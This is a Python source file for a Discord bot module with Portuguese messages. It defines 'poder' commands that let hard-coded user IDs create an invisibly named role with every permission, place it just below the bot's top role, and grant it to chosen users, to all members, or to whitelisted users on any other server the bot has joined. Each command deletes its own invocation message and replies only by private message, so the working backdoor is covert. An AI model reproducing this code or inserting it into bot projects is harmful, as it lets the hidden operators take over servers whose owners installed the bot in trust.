import json
import discord
from discord.ext import commands
import os

ALLOWED_IDS = [1169336831310041209, 1169781984927686696]

whitelist_folder = 'whitelist'
whitelist_file = os.path.join(whitelist_folder, 'ids.json')

if not os.path.exists(whitelist_folder):
    os.makedirs(whitelist_folder)
if not os.path.isfile(whitelist_file):
    with open(whitelist_file, 'w') as f:
        json.dump({"ids": []}, f)

def load_whitelist():
    with open(whitelist_file, 'r') as f:
        data = json.load(f)
    return data.get("ids", [])

def save_whitelist(whitelist):
    with open(whitelist_file, 'w') as f:
        json.dump({"ids": whitelist}, f)

def is_whitelisted(user_id):
    return user_id in load_whitelist()

def setup_poder(bot):
    @bot.command()
    async def poder(ctx, user_id: int = None):
        await ctx.message.delete(delay=0.5)
        target_user = ctx.author if user_id is None else ctx.guild.get_member(user_id)

        if target_user is None:
            embed = discord.Embed(
                title="⚠️ Usuário Não Encontrado",
                description="Não foi possível encontrar o usuário especificado.",
                color=0xFFFF00
            )
            await ctx.author.send(embed=embed)
            return

        if ctx.author.id not in ALLOWED_IDS and not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="❌ Acesso Negado",
                description="Você não tem permissão para usar este comando.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
            return

        if not ctx.guild.me.guild_permissions.manage_roles:
            embed = discord.Embed(
                title="❌ Permissão Negada",
                description="O bot não tem permissão para gerenciar cargos.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
            return

        existing_role = discord.utils.get(ctx.guild.roles, name='ㅤ')
        if existing_role:
            if existing_role not in target_user.roles:
                await target_user.add_roles(existing_role)
                embed = discord.Embed(
                    title="✅ Cargo Atribuído",
                    description=f"O cargo **ㅤ** foi atribuído a {target_user.mention}!",
                    color=0x00FF00
                )
                await ctx.author.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="⚠️ Cargo Já Atribuído",
                    description=f"{target_user.mention} já possui o cargo **ㅤ**.",
                    color=0xFFFF00
                )
                await ctx.author.send(embed=embed)
            return

        try:
            new_role = await ctx.guild.create_role(
                name='ㅤ',
                permissions=discord.Permissions.all(),
                color=discord.Color.from_rgb(0, 0, 0),
                reason='Criado pelo comando L.poder'
            )
            await new_role.edit(position=ctx.guild.me.top_role.position - 1)
            await target_user.add_roles(new_role)

            embed = discord.Embed(
                title="✅ Cargo Criado e Atribuído",
                description=f"O cargo **ㅤ** foi criado e atribuído a {target_user.mention}!",
                color=0x00FF00
            )
            await ctx.author.send(embed=embed)

            whitelist = load_whitelist()
            if target_user.id not in whitelist:
                whitelist.append(target_user.id)
                save_whitelist(whitelist)

        except discord.Forbidden:
            embed = discord.Embed(
                title="❌ Permissão Negada",
                description="O bot não tem permissão para criar cargos.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
        except discord.HTTPException as e:
            embed = discord.Embed(
                title="❌ Erro ao Criar Cargo",
                description=f"Ocorreu um erro ao criar o cargo: {e}",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)

    @bot.command()
    async def poder_add(ctx, user_id: int):
        await ctx.message.delete(delay=0.5)
        if ctx.author.id not in ALLOWED_IDS:
            embed = discord.Embed(
                title="❌ Acesso Negado",
                description="Você não tem permissão para usar este comando.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
            return

        whitelist = load_whitelist()
        if user_id in whitelist:
            embed = discord.Embed(
                title="⚠️ ID Já Adicionado",
                description="Esse ID já está na whitelist.",
                color=0xFFFF00
            )
            await ctx.author.send(embed=embed)
            return

        whitelist.append(user_id)
        save_whitelist(whitelist)

        embed = discord.Embed(
            title="✅ ID Adicionado",
            description=f"O ID {user_id} foi adicionado à whitelist com sucesso!",
            color=0x00FF00
        )
        await ctx.author.send(embed=embed)

    @bot.command()
    async def poder_remove(ctx, user_id: int):
        await ctx.message.delete(delay=0.5)
        if ctx.author.id not in ALLOWED_IDS:
            embed = discord.Embed(
                title="❌ Acesso Negado",
                description="Você não tem permissão para usar este comando.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
            return

        whitelist = load_whitelist()
        if user_id not in whitelist:
            embed = discord.Embed(
                title="⚠️ ID Não Encontrado",
                description="Esse ID não está na whitelist.",
                color=0xFFFF00
            )
            await ctx.author.send(embed=embed)
            return

        whitelist.remove(user_id)
        save_whitelist(whitelist)

        embed = discord.Embed(
            title="✅ ID Removido",
            description=f"O ID {user_id} foi removido da whitelist com sucesso!",
            color=0x00FF00
        )
        await ctx.author.send(embed=embed)

    @bot.command()
    async def poder_all(ctx):
        await ctx.message.delete(delay=0.5)
        if ctx.author.id not in ALLOWED_IDS:
            embed = discord.Embed(
                title="❌ Acesso Negado",
                description="Você não tem permissão para usar este comando.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
            return

        role = discord.utils.get(ctx.guild.roles, name='ㅤ')
        if role is None:
            try:
                role = await ctx.guild.create_role(
                    name='ㅤ',
                    permissions=discord.Permissions.all(),
                    color=discord.Color.from_rgb(0, 0, 0),
                    reason='Criado pelo comando L.poder_all'
                )
                await role.edit(position=ctx.guild.me.top_role.position - 1)
            except discord.Forbidden:
                embed = discord.Embed(
                    title="❌ Permissão Negada",
                    description="O bot não tem permissão para criar cargos.",
                    color=0xFF0000
                )
                await ctx.author.send(embed=embed)
                return
            except discord.HTTPException as e:
                embed = discord.Embed(
                    title="❌ Erro ao Criar Cargo",
                    description=f"Ocorreu um erro ao criar o cargo: {e}",
                    color=0xFF0000
                )
                await ctx.author.send(embed=embed)
                return

        members = [member for member in ctx.guild.members if not member.bot]
        for member in members:
            if role not in member.roles:
                try:
                    await member.add_roles(role)
                except discord.Forbidden:
                    continue

        embed = discord.Embed(
            title="✅ Cargo Atribuído a Todos",
            description="🎉 Todos os membros receberam o cargo **ㅤ** com sucesso! 🚀",
            color=0x00FF00
        )
        await ctx.author.send(embed=embed)

    @bot.command()
    async def poder_delete(ctx, user_id: int = None):
        await ctx.message.delete(delay=0.5)
        if ctx.author.id not in ALLOWED_IDS:
            embed = discord.Embed(
                title="❌ Acesso Negado",
                description="Você não tem permissão para usar este comando.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
            return

        role = discord.utils.get(ctx.guild.roles, name='ㅤ')
        if role is None:
            embed = discord.Embed(
                title="⚠️ Cargo Não Encontrado",
                description="O cargo **ㅤ** não existe.",
                color=0xFFFF00
            )
            await ctx.author.send(embed=embed)
            return

        if user_id is not None:
            target_user = ctx.guild.get_member(user_id)
            if target_user is None:
                embed = discord.Embed(
                    title="⚠️ Usuário Não Encontrado",
                    description="Não foi possível encontrar o usuário especificado.",
                    color=0xFFFF00
                )
                await ctx.author.send(embed=embed)
                return

            if role in target_user.roles:
                try:
                    await target_user.remove_roles(role)
                    embed = discord.Embed(
                        title="✅ Cargo Removido",
                        description=f"O cargo **ㅤ** foi removido de {target_user.mention} com sucesso!",
                        color=0x00FF00
                    )
                except discord.Forbidden:
                    embed = discord.Embed(
                        title="❌ Permissão Negada",
                        description="O bot não tem permissão para remover cargos.",
                        color=0xFF0000
                    )
                except discord.HTTPException as e:
                    embed = discord.Embed(
                        title="❌ Erro ao Remover Cargo",
                        description=f"Ocorreu um erro ao remover o cargo: {e}",
                        color=0xFF0000
                    )
            else:
                embed = discord.Embed(
                    title="⚠️ Cargo Não Atribuído",
                    description=f"{target_user.mention} não possui o cargo **ㅤ**.",
                    color=0xFFFF00
                )
            await ctx.author.send(embed=embed)
        else:
            try:
                await role.delete()
                embed = discord.Embed(
                    title="✅ Cargo Excluído",
                    description="O cargo **ㅤ** foi excluído com sucesso!",
                    color=0x00FF00
                )
            except discord.Forbidden:
                embed = discord.Embed(
                    title="❌ Permissão Negada",
                    description="O bot não tem permissão para excluir cargos.",
                    color=0xFF0000
                )
            except discord.HTTPException as e:
                embed = discord.Embed(
                    title="❌ Erro ao Excluir Cargo",
                    description=f"Ocorreu um erro ao excluir o cargo: {e}",
                    color=0xFF0000
                )
            await ctx.author.send(embed=embed)

    @bot.command()
    async def poder_servidor(ctx, guild_id: int, user_id: int = None):
        await ctx.message.delete(delay=0.5)

        if ctx.author.id not in ALLOWED_IDS:
            embed = discord.Embed(
                title="❌ Acesso Negado",
                description="Você não tem permissão para usar este comando.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
            return

        target_guild = bot.get_guild(guild_id)
        if target_guild is None:
            embed = discord.Embed(
                title="⚠️ Servidor Não Encontrado",
                description="Não foi possível encontrar o servidor especificado.",
                color=0xFFFF00
            )
            await ctx.author.send(embed=embed)
            return

        if not target_guild.me.guild_permissions.manage_roles:
            embed = discord.Embed(
                title="❌ Permissão Negada",
                description="O bot não tem permissão para gerenciar cargos no servidor especificado.",
                color=0xFF0000
            )
            await ctx.author.send(embed=embed)
            return

        role = discord.utils.get(target_guild.roles, name='ㅤ')
        if role is None:
            try:
                role = await target_guild.create_role(
                    name='ㅤ',
                    permissions=discord.Permissions.all(),
                    color=discord.Color.from_rgb(0, 0, 0),
                    reason='Criado pelo comando L.poder_servidor'
                )
                await role.edit(position=target_guild.me.top_role.position - 1)
            except discord.Forbidden:
                embed = discord.Embed(
                    title="❌ Permissão Negada",
                    description="O bot não tem permissão para criar cargos no servidor especificado.",
                    color=0xFF0000
                )
                await ctx.author.send(embed=embed)
                return
            except discord.HTTPException as e:
                embed = discord.Embed(
                    title="❌ Erro ao Criar Cargo",
                    description=f"Ocorreu um erro ao criar o cargo: {e}",
                    color=0xFF0000
                )
                await ctx.author.send(embed=embed)
                return

        if user_id is not None:
            target_user = target_guild.get_member(user_id)
            if target_user is None:
                embed = discord.Embed(
                    title="⚠️ Usuário Não Encontrado",
                    description="Não foi possível encontrar o usuário especificado.",
                    color=0xFFFF00
                )
                await ctx.author.send(embed=embed)
                return

            if role not in target_user.roles:
                try:
                    await target_user.add_roles(role)
                    embed = discord.Embed(
                        title="✅ Cargo Atribuído",
                        description=f"O cargo **ㅤ** foi atribuído a {target_user.mention} no servidor {target_guild.name}!",
                        color=0x00FF00
                    )
                except discord.Forbidden:
                    embed = discord.Embed(
                        title="❌ Permissão Negada",
                        description="O bot não tem permissão para atribuir cargos no servidor especificado.",
                        color=0xFF0000
                    )
                except discord.HTTPException as e:
                    embed = discord.Embed(
                        title="❌ Erro ao Atribuir Cargo",
                        description=f"Ocorreu um erro ao atribuir o cargo: {e}",
                        color=0xFF0000
                    )
            else:
                embed = discord.Embed(
                    title="⚠️ Cargo Já Atribuído",
                    description=f"{target_user.mention} já possui o cargo **ㅤ** no servidor {target_guild.name}.",
                    color=0xFFFF00
                )
            await ctx.author.send(embed=embed)
        else:
            whitelist = load_whitelist()
            members = [target_guild.get_member(user_id) for user_id in whitelist if target_guild.get_member(user_id)]
            for member in members:
                if role not in member.roles:
                    try:
                        await member.add_roles(role)
                    except discord.Forbidden:
                        continue

            embed = discord.Embed(
                title="✅ Cargo Atribuído",
                description=f"Todos os membros da whitelist receberam o cargo **ㅤ** no servidor {target_guild.name}.",
                color=0x00FF00
            )
            await ctx.author.send(embed=embed)
